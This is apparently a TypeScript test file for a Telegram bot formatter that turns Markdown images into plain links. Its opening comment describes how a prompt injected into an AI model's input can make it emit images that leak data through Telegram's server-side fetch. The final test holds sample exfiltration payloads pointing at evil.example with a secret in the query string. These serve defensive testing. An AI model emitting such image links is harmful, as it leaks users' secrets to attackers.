// SPDX-License-Identifier: AGPL-3.0-only
import { expect, test } from 'vitest'
import { forRich, MARKER, withMarker } from '../format.js'

// A Markdown image makes Telegram's own servers fetch the URL — a model, or a prompt
// injected into something it read, can turn that into an exfiltration channel. `forRich`
// is the one place that gets closed, and these tests are the shape of "closed": every image
// becomes a plain link, a `tg://` target is dropped outright, and nothing inside a code
// fence or span is ever touched, because quoting Markdown is not sending it.

test('an image becomes a plain link', () => {
  expect(forRich('![a cat](https://example.com/cat.png)')).toBe('[a cat](https://example.com/cat.png)')
})

test('an image with no alt text uses the url as the link text', () => {
  expect(forRich('![](https://example.com/cat.png)')).toBe('[https://example.com/cat.png](https://example.com/cat.png)')
})

test('a title is stripped, not carried onto the link', () => {
  expect(forRich('![a cat](https://example.com/cat.png "a title")')).toBe('[a cat](https://example.com/cat.png)')
})

test('a tg:// image is dropped entirely', () => {
  expect(forRich('before ![x](tg://resolve?domain=x) after')).toBe('before  after')
})

test('a tg:// link is dropped, but its text survives', () => {
  expect(forRich('open [settings](tg://settings) please')).toBe('open settings please')
})

test('an ordinary link is left untouched, title and all', () => {
  const text = 'see [the docs](https://example.com/docs "read me")'
  expect(forRich(text)).toBe(text)
})

test('a fenced code block is not rewritten, even if it looks like an image', () => {
  const text = 'text\n```\n![a cat](https://example.com/cat.png)\n```\nmore'
  expect(forRich(text)).toBe(text)
})

test('an inline code span is not rewritten', () => {
  const text = 'use `![alt](url)` to add an image'
  expect(forRich(text)).toBe(text)
})

test('code is left alone while the surrounding text is still rewritten', () => {
  const text = 'see ![a cat](https://example.com/cat.png) and `![alt](url)` too'
  expect(forRich(text)).toBe('see [a cat](https://example.com/cat.png) and `![alt](url)` too')
})

test('the marker is italic in a rich message and plain otherwise', () => {
  expect(withMarker('hello', true)).toBe(`hello\n\n_${MARKER}_`)
  expect(withMarker('hello', false)).toBe(`hello\n\n${MARKER}`)
})

test('an image the link pattern cannot read is still not an image', () => {
  // Brackets inside the alt text, and the reference form: both are images to a Markdown
  // reader, and neither is shaped like `[label](url)`. Without the `!` neither fetches.
  expect(forRich('![a [b]](https://evil.example/?q=secret)')).not.toContain('![')
  expect(forRich('![a][ref]\n\n[ref]: https://evil.example/?q=secret')).not.toContain('![')
  expect(forRich('![x](TG://photo?id=1) y')).toBe(' y')
})
